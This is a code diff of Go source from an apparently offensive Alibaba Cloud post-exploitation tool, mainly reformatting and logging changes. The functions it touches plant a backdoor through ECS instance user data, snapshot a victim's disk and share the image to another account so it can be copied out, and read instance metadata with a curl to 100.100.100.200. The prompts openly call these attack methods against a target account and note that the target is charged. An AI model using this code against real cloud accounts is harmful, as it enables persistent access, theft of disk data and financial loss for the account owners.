@@ -199,22 +199,22 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 			specifiedInstanceID := i.InstanceId
 			if userDataBackdoor != "" {
 				UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType, i.Status)
-			} else if imageShare !="" {
+			} else if imageShare != "" {
 				var isSure string
 				prompt := &survey.Input{
-			        Message: "警告：使用该攻击手法，会在目标账户上新建一个快照和镜像，本程序在攻击成功后提供删除功能。\n但如果因为意外情况导致快照或镜像残留在目标，有可能导致目标阿里云账户造成不必要支出。\n如果你已明确并确认要使用此攻击手法，请键入Yes，键入其他单词将退出此功能 \n(Warning: Using this attack method, a snapshot and mirror will be created on the target account. This program provides deletion function after successful attack. However, if the snapshot or mirror remains on the target due to unexpected circumstances, unnecessary expenses may be caused to the target Ali Cloud account. If you have specified and confirmed that you want to use this attack, type Yes.Any other words will exit this feature)",
-			    }
-			    survey.AskOne(prompt, &isSure)
-			    if isSure == "Yes" {
-			    	ImageShare(i.RegionId, imageShare, specifiedInstanceID, timeOut)
-			    }
-			}else if i.Status == "Running" {
+					Message: "警告：使用该攻击手法，会在目标账户上新建一个快照和镜像，本程序在攻击成功后提供删除功能。\n但如果因为意外情况导致快照或镜像残留在目标，有可能导致目标阿里云账户造成不必要支出。\n如果你已明确并确认要使用此攻击手法，请键入Yes，键入其他单词将退出此功能 \n(Warning: Using this attack method, a snapshot and mirror will be created on the target account. This program provides deletion function after successful attack. However, if the snapshot or mirror remains on the target due to unexpected circumstances, unnecessary expenses may be caused to the target Ali Cloud account. If you have specified and confirmed that you want to use this attack, type Yes.Any other words will exit this feature)",
+				}
+				survey.AskOne(prompt, &isSure)
+				if isSure == "Yes" {
+					ImageShare(i.RegionId, imageShare, specifiedInstanceID, timeOut)
+				}
+			} else if i.Status == "Running" {
 				num = num + 1
 				InstanceName := i.InstanceName
 				region := i.RegionId
 				OSType := i.OSType
 				if userData == true {
-					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, true)
 					if commandResult == "" {
 						fmt.Println("未找到用户数据 (User data not found)")
 					} else if commandResult == "disabled" {
@@ -281,7 +281,7 @@ func getExecResult(region string, command string, OSType string, scriptType stri
 	return commandResult
 }
 
-func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
+func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int, isPrint bool) string {
 	var command string
 	if OSType == "linux" {
 		command = "curl -s http://100.100.100.200/latest/user-data/"
@@ -300,14 +300,20 @@ func getUserData(region string, OSType string, scriptType string, specifiedInsta
 		}
 		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
 		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			if isPrint {
+				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			}
 			commandResult = "disabled"
 		}
 	} else if strings.Contains(commandResult, "404 - Not Found") {
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		if isPrint {
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		}
 		commandResult = ""
 	} else {
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		if isPrint {
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		}
 	}
 	return commandResult
 }
@@ -362,21 +368,26 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 }
 
 func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string, ecsStatus string) {
+	var commandResult1 string
 	if ecsStatus == "Running" {
-		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+		commandResult1 = commandResult
 		if commandResult == "disabled" {
-			fmt.Println("元数据拒绝访问 (Metadata access is denied)")
+			log.Warnln("元数据拒绝访问，无法读取到用户数据 (Metadata Access Denied. Unable to retrieve user data.)")
 			return
 		}
 		if commandResult != "" {
-			var isSure string
-			prompt := &survey.Input{
-		        Message: "警告：检测到目标机器原本已有元数据，是否进行覆盖写入，此操作可能会导致业务上造成损失。如果你确定要使用此攻击手法，请键入Yes (Warning: Metadata has been detected on the target machine. Determine whether to write metadata to the target machine. This operation may cause service loss. If you are sure you want to use this attack, type Yes)",
-		    }
-		    survey.AskOne(prompt, &isSure)
-		    if isSure != "Yes" {
-		    	return
-		    }
+			var isSure bool
+			prompt := &survey.Confirm{
+				Message: "检测到目标机器已有用户数据，是否进行覆盖写入？(Detected existing user data on the target machine. Would you like to proceed with overwrite?)",
+				Default: false,
+			}
+			err := survey.AskOne(prompt, &isSure)
+			errutil.HandleErr(err)
+			if !isSure {
+				log.Infoln("已中止操作 (The operation has been aborted.)")
+				return
+			}
 		}
 	}
 	request := ecs.CreateModifyInstanceAttributeRequest()
@@ -392,19 +403,20 @@ func UserDataBackdoor(region string, command string, specifiedInstanceID string,
 	commandResult := response.GetHttpStatus()
 	if commandResult == 200 {
 		if ecsStatus == "Running" {
-			fmt.Println("执行成功，正在查询userdata值 (The execution is successful, and the userdata value is being queried)")
-			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
-			fmt.Println(commandResult2)
+			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
+			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+			color.Printf("\n<lightGreen>原来的用户数据 (Original user data): </> \n%s\n", commandResult1)
+			color.Printf("\n<lightGreen>现在的用户数据 (Current user data): </> \n%s\n\n", commandResult2)
 		} else {
-			fmt.Println("执行成功 (The execution is successful)")
+			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
 		}
-		fmt.Println("如需使后门立即生效，请重启目标服务器 (For the backdoor to take effect immediately, please restart the target instance)")
+		log.Infoln("用户数据后门会在实例重启后生效 (The user data backdoor will take effect after the instance is restarted.)")
 	} else {
-		fmt.Println("写入失败，请确认是否有 ModifyInstanceAttribute 权限 (Failed to write, please confirm whether you have the ModifyInstanceAttribute permission)")
+		fmt.Println("写入失败，权限不足 (Write failed, insufficient permissions.)")
 	}
 }
 
-func ImageDelete(region string,aliyunAccount string, imageId string, specifiedInstanceID string) {
+func ImageDelete(region string, aliyunAccount string, imageId string, specifiedInstanceID string) {
 	modifyImageSharePermissionRequest := ecs.CreateModifyImageSharePermissionRequest()
 	modifyImageSharePermissionRequest.Scheme = "https"
 	modifyImageSharePermissionRequest.ImageId = imageId
@@ -414,7 +426,7 @@ func ImageDelete(region string,aliyunAccount string, imageId string, specifiedIn
 
 	deleteImageRequest := ecs.CreateDeleteImageRequest()
 	deleteImageRequest.ImageId = imageId
-	deleteImageRequest.QueryParams["Force"] = "true"	
+	deleteImageRequest.QueryParams["Force"] = "true"
 	_, err := ECSClient(region).DeleteImage(deleteImageRequest)
 	errutil.HandleErr(err)
 
@@ -428,12 +440,12 @@ func ImageDelete(region string,aliyunAccount string, imageId string, specifiedIn
 	var lastModifiedTime time.Time
 	var snapShotId string
 	for _, snapshot := range describeSnapshotsResponse.Snapshots.Snapshot {
-        snapshotTime, _ := time.Parse(time.RFC3339, snapshot.LastModifiedTime)
-        if snapshotTime.After(lastModifiedTime) {
-            lastModifiedTime = snapshotTime
-            snapShotId = snapshot.SnapshotId
-        }
-    }
+		snapshotTime, _ := time.Parse(time.RFC3339, snapshot.LastModifiedTime)
+		if snapshotTime.After(lastModifiedTime) {
+			lastModifiedTime = snapshotTime
+			snapShotId = snapshot.SnapshotId
+		}
+	}
 
 	deleteSnapshotRequest := ecs.CreateDeleteSnapshotRequest()
 	deleteSnapshotRequest.SnapshotId = snapShotId
@@ -472,7 +484,6 @@ func ImageShare(region string, aliyunAccount string, specifiedInstanceID string,
 		time.Sleep(5 * time.Second)
 	}
 
-
 	modifyImageSharePermissionRequest := ecs.CreateModifyImageSharePermissionRequest()
 	modifyImageSharePermissionRequest.Scheme = "https"
 	modifyImageSharePermissionRequest.ImageId = imageId
@@ -488,12 +499,12 @@ func ImageShare(region string, aliyunAccount string, specifiedInstanceID string,
 
 	cleanImage := []string{"Yes"}
 	var cleanImageChoose string
-    prompt := &survey.Select{
-        Message: "删除共享镜像？注意，共享镜像后，被攻击对象已开始扣费，请复制共享镜像后，按回车删除共享镜像。若暂未复制镜像，请勿按回车 (Delete the shared mirror? Notice After the image is shared, the target starts to deduct fees. After copying the shared image, press Enter to delete the shared image. If the image is not copied, do not press Enter)",
-        Options: cleanImage,
-    }
-    survey.AskOne(prompt, &cleanImageChoose)
-    if cleanImageChoose == "Yes" {
-    	ImageDelete(region, aliyunAccount, imageId, specifiedInstanceID)
-    }
+	prompt := &survey.Select{
+		Message: "删除共享镜像？注意，共享镜像后，被攻击对象已开始扣费，请复制共享镜像后，按回车删除共享镜像。若暂未复制镜像，请勿按回车 (Delete the shared mirror? Notice After the image is shared, the target starts to deduct fees. After copying the shared image, press Enter to delete the shared image. If the image is not copied, do not press Enter)",
+		Options: cleanImage,
+	}
+	survey.AskOne(prompt, &cleanImageChoose)
+	if cleanImageChoose == "Yes" {
+		ImageDelete(region, aliyunAccount, imageId, specifiedInstanceID)
+	}
 }
